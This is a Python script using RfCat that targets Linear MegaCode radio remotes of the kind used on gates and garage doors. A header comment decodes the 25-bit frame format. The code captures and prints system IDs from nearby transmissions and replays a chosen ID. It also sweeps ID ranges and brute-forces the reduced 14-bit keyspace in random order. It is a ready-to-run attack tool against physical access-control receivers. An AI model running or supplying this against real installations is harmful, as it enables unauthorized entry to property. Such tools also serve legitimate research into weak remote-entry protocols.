#!/usr/bin/env python
#11/18/2017 rjmendez
'''
Reading the Linear protocol documentation describes a 6ms 25 bit-frame with individual 1ms symbols 

  sync      1      2      3      4      5      6      7      8      9     10     11     12     13     14     15     16     17     18     19     20     21     22     23
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
     1      1     8       1      8      1      8      1      8      8      8      1      8      1      8      1      8      8      1      1      8      8      1      8    NUL

If 000001 = 1 and 001000 = 0:
110101010001010100110010NUL
D51532

Documentation describes frame 0 as the sync frame, 1-20 as system code, and 21-23 as data bits.

10101010001010100110 010
AA2A6 2
'''
import binascii, bitstring, sys, getopt, rflib, time, random, re

#Help
help_msg = '\nLinear Technologies MegaCode RfCat transmitter and receiver.\n\nUse this to transmit a single remote ID or iterate through a range.\nYou can also listen for a defined period of time and display recorded IDs.\nIDs are 20 bits and are provided as an integer between 1 and 1048575.\n    -s, --systemid    <integer between 1-1048575>\n    -l, --lower       <lower end of range>\n    -u, --upper       <upper end of range>\n    -b, --bruteforce  Attempts to randomly guess a key in the reduced 14 bit keyspace based on research from King Kevin at www.cuvoodoo.info\n    -r, --record      <seconds> Listen for transmissions and return the IDs and data.\n\n'

#Radio stuff
frequency = 318010000
baudRate = 1000
keyLen = 0

def ConfigureD(d):
    d.setMdmModulation(rflib.MOD_ASK_OOK)
    d.setFreq(frequency)
    d.makePktFLEN(keyLen)
    d.setMdmDRate(baudRate)
    d.setMaxPower()
    d.lowball()
#Padding the input values.
def PadBytes(byte_length, hex_val):
    pad_num = byte_length-len(hex_val)
    if pad_num >= 1:
        pad_str = "0" * pad_num
        padded_hex_val = str(pad_str + hex_val)
        return padded_hex_val
    if pad_num == 0:
        #do nothing
        padded_hex_val = hex_val
        return padded_hex_val
    if pad_num < 0:
        print(str(hex_val))
        print('Invalid length of input, was expecting <= ' + str(byte_length) + ' but we got ' + str(len(hex_val)) + ' instead!')
        print(help_msg)
        quit()

def PacketValues(sysid, PacketLen):
    input_hex = PadBytes(PacketLen, str(hex(sysid)).lstrip("0x"))    
    return input_hex

def ValidateInput_sysid_single(sysid):
    if sysid >= 1048576:
        print("Invalid System ID Detected!")
        print(help_msg)
        quit()
    if sysid <= 1048575:
        return sysid

def ValidateInput_sysid_lower(sysid_lower, sysid_upper):
    if sysid_upper <= sysid_lower:
        print("Invalid Range Detected!\nUpper value must be greater than lower value!")
        print(help_msg)
        quit()
    if sysid_upper >= 1048576:
        print("Invalid System ID Detected!")
        print(help_msg)
        quit()
    if sysid_lower >= 1:
        return sysid_lower


def ValidateInput_sysid_upper(sysid_lower, sysid_upper):
    if sysid_upper <= sysid_lower:
        print("Invalid Range Detected!\nUpper value must be greater than lower value!")
        print(help_msg)
        quit()
    if sysid_upper >= 1048576:
        print("Invalid System ID Detected!")
        print(help_msg)
        quit()
    if sysid_upper <= 1048575:
        return sysid_upper

#Bytes to Bits ascii stream.
def byte_to_binary(n):
    return ''.join(str((n & (1 << i)) and 1) for i in reversed(range(8)))
#Hex to Bytes.
def hex_to_binary(h):
    return ''.join(byte_to_binary(ord(b)) for b in binascii.unhexlify(h))

def FormatBitFrame_tx(input_bin):
    output_bin = ''
    for bit in input_bin:
        if bit == '0':
            output_bin += '001000'
        elif bit == '1':
            output_bin += '000001'
        else:
            print("Failed to match bitstream while formatting!")
    return output_bin

def FormatBitFrame_rx(input_bin):
    chunks, chunk_size = len(input_bin), len(input_bin)/24
    chunks_list = [ input_bin[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
    output_bin = ''
    for c in chunks_list:
        if c == '000001':
            output_bin += '1'
        elif c == '001000':
            output_bin += '0'
        else:
            print("Failed to match bitstream while formatting!")
    return output_bin

def TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail, repeat_num):
    #sync_frame = "000001"
    #data_frame = "001000000001001000" #value = 2
    #null_tail  = "000000"
    rf_data = bitstring.BitArray(bin=sync_frame+output_bin+data_frame+null_tail).tobytes()
    keyLen = len(rf_data)
    #Transmit here.
    print('Sending packet payload: ' + input_hex + '2' + ' System ID: ' + str(int(input_hex, 16)))
    d.RFxmit(rf_data, repeat=repeat_num)
    print('-'*40)

def Capture(d):
    capture = ""
    while (1):
        try:
            y, z = d.RFrecv()
            capture = y.encode('hex')
            print('Scanning...')
            
        except rflib.ChipconUsbTimeoutException: 
            pass
        if capture:
            break
    #Parse packets from the capture by reading tailing zeroes and sync frame zeroes of the next, one packet is always lost.
    bin_capture = str(bin(int(capture, 16)))[2:]
    payloads = re.split ('0'*14, bin_capture)
    return payloads

def main(argv):
    data = 1
    rxid = ''
    sysid = ''
    sysid_lower = False
    sysid_upper = False
    sysid_range = False
    sysid_single = False
    record = False
    bruteforce = False
    input_hex = ''
    output_hex = ''
    
    try:
        opts, args = getopt.getopt(argv,"hl:u:s:b:r:",["lower=","upper=","systemid","bruteforce","record"])
    except getopt.GetoptError as error:
        print(error)
        print(help_msg)
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print(help_msg)
            sys.exit()
        elif opt in ("-l", "--lower"):
            sysid_lower = int(arg)
            sysid_single = False
            record = False
        elif opt in ("-u", "--upper"):
            sysid_upper = int(arg)
            sysid_single = False
            record = False
        elif opt in ("-s", "--systemid"):
            sysid = int(arg)
            sysid_range = False
            sysid_single = True
            record = False
        elif opt in ("-r", "--record"):
            running = int(arg)
            bruteforce = False
            sysid_single = False
            sysid_range = False
            record = True
        elif opt in ("-b", "--bruteforce"):
            bruteforce = True
            sysid_single = False
            sysid_range = False
            record = False
            sysid_lower = 1
            sysid_upper = 16383

    if len(sys.argv) == 1:
        print('Invalid input, program accepts the following input format:\n' + help_msg)
        sys.exit(2)

    if (sysid_lower or sysid_upper) and sysid:
        print('Invalid input, cannot accept range AND single System ID!')
    if (sysid_lower and sysid_upper) and not bruteforce:
        print('Generating System ID ' + str(sysid_lower) + ' through ' + str(sysid_upper))
        sysid_range = True
        sysid_single = False
    if not (sysid_lower and sysid_upper) and sysid:
        print('Sending single System ID ' + str(sysid))
        sysid_range = False
    if (sysid_lower and sysid_upper) and bruteforce:
        print('Generating System ID ' + str(sysid_lower) + ' through ' + str(sysid_upper))
        sysid_range = False
        sysid_single = False


    if sysid_single:
        sysid = ValidateInput_sysid_single(sysid)
        #Generate packet hex
        input_hex = PacketValues(sysid, 6)
        #Convert hex to binary ascii stream
        input_bin = hex_to_binary(input_hex)
        input_bin = input_bin[4:] #Removing extra null byte
        output_bin = FormatBitFrame_tx(input_bin)
        #print('Configuring RfCat...')
        d = rflib.RfCat()
        d.setModeIDLE()
        #print('Configuring Radio...')
        ConfigureD(d)
        sync_frame = "000001"
        data_frame = "001000000001001000" #value = 2
        null_tail  = "000000"
        TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail, 3)
        time.sleep(0.01)
        d.setModeIDLE()
        print('Done!')
        quit()

    if sysid_range:
        sysid_lower = ValidateInput_sysid_lower(sysid_lower, sysid_upper)
        sysid_upper = ValidateInput_sysid_upper(sysid_lower, sysid_upper)
        #print('Configuring RfCat...')
        d = rflib.RfCat()
        d.setModeIDLE()
        #print('Configuring Radio...')
        ConfigureD(d)
        sync_frame = "000001"
        data_frame = "001000000001001000" #value = 2
        null_tail  = "000000"
        for i in range(sysid_lower, sysid_upper+1, 1):
            #Generate packet hex
            input_hex = PacketValues(i, 6)
            #Convert hex to binary ascii stream
            input_bin = hex_to_binary(input_hex)
            input_bin = input_bin[4:] #Removing extra null byte
            output_bin = FormatBitFrame_tx(input_bin)
            TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail, 3)
            time.sleep(0.005)
        d.setModeIDLE()
        print('Done!')
        quit()

    if bruteforce:
        sysid_lower = ValidateInput_sysid_lower(sysid_lower, sysid_upper)
        sysid_upper = ValidateInput_sysid_upper(sysid_lower, sysid_upper)
        #print('Configuring RfCat...')
        d = rflib.RfCat()
        d.setModeIDLE()
        #print('Configuring Radio...')
        ConfigureD(d)
        sync_frame = "000001 000001 001000 000001 001000"
        data_frame = "001000 001000 001000 000001 001000" #value = 2
        null_tail  = "000000"
        rand_list = list(range(sysid_lower, sysid_upper+1, 1))
        random.shuffle(rand_list)
        for i in rand_list:
            #Generate packet hex
            input_hex = PacketValues(i, 6)
            #Convert hex to binary ascii stream
            input_bin = hex_to_binary(input_hex).lstrip("0")
            #print(input_bin + ' ' + str(len(input_bin)))
            input_bin = PadBytes(14, input_bin)
            #print(input_bin + ' ' + str(len(input_bin)))
            output_bin = FormatBitFrame_tx(input_bin)
            TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail, 3)
            time.sleep(0.005)
        d.setModeIDLE()
        print('Done!')
        quit()

    if record:
        rxlist = []
        #print('Configuring RfCat...')
        d = rflib.RfCat()
        #d.setModeIDLE()
        #print('Configuring Radio...')
        ConfigureD(d)
        while running > 0:
            running = running-1
            print(str(running) + ' Seconds remaining')
            for payload in Capture(d):
                if '1' in payload[:1] and (len(payload) == 136) and (len(payload) % 2 == 0):
                    binary = "00000"+payload+"000000000"
                    if len(binary) == 150:
                        Linear_packet = []
                        Linear_packet_raw = FormatBitFrame_rx(binary)
                        print("\nLinear Packet: " + Linear_packet_raw)
                        Linear_packet_systemid_rx = str(int(Linear_packet_raw[1:len(Linear_packet_raw)-3], 2))
                        print("System ID: " + Linear_packet_systemid_rx)
                        Linear_packet_data = str(int(Linear_packet_raw[len(Linear_packet_raw)-3:], 2))
                        print("Data: " + str(int(Linear_packet_raw[len(Linear_packet_raw)-3:], 2)))
                        Linear_packet += binary, Linear_packet_raw, Linear_packet_systemid_rx, Linear_packet_data
                        rxlist += Linear_packet
                else:
                    continue
        for pkt in rxlist:
            print(pkt)
        d.setModeIDLE()
        print('Done!')

    if not [sysid_range, sysid_single, record, bruteforce]:
        print('Incomplete parameters specified!')
        print(help_msg)

if __name__ == "__main__":
    main(sys.argv[1:])

